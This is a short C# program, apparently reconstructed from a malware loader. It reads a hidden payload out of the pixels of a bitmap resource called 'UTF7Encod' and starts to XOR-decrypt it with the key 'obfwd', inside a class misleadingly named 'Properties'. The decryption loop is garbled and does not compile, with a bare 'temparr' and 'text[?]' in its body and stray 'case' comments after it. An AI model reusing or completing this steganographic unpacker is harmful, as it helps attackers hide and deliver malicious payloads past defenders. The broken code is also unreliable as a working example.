using System;
using System.Reflection;
using System.Resources;
using System.Drawing;
using System.Text;


namespace Project
{
    class Properties
    {
        static void Main(string[] args)
        {
            ResourceManager rsm = 
                ResourceManager.CreateFileBasedResourceManager("Project.Properties.Resources", "Resources", null);
            Object obj = rsm.GetObject("UTF7Encod");
            Bitmap bitmap = (Bitmap)obj;

            byte[] arr, bytes, ret;
            int offset, width, length, w1, w2;
            Size size;
            Color color;

            offset = 0;
            size = bitmap.Size;
            width = size.Width;
            arr = new byte[width * width * 4];

            w1 = width - 1;
            for (int i = 0; i <= w1; i++)
            {
                w2 = width - 1;
                for (int j = 0; j <= w2; j++)
                {
                    color = bitmap.GetPixel(i, j);
                    System.Buffer.BlockCopy(System.BitConverter.GetBytes(color.ToArgb()), 0, arr, offset, 4);
                    offset += 4;
                }
            }
            
            length = System.BitConverter.ToInt32(arr, 0);
            bytes = new byte[length];

            System.Buffer.BlockCopy(arr, 4, bytes, 0, bytes.Length);
            ret = bytes;

            byte[] text = Encoding.BigEndianUnicode.GetBytes("obfwd"); // 0xA
            int xor = ret[ret.Length - 1] ^ 0x70; // 2
            byte[] temparr = new byte[ret.Length + 1]; // 3
            int minusone = ret.Length - 1; // 4
            int idxleng = minusone; // 5

            for (int i = 0 /* 6 */; /* case 6 */ i <= idxleng; i++)
            {
                temparr
                i
                ret[i] ^ xor ^ text[?]
            }
            
            /* case 9 */

            Console.ReadKey();
        }
    }
}
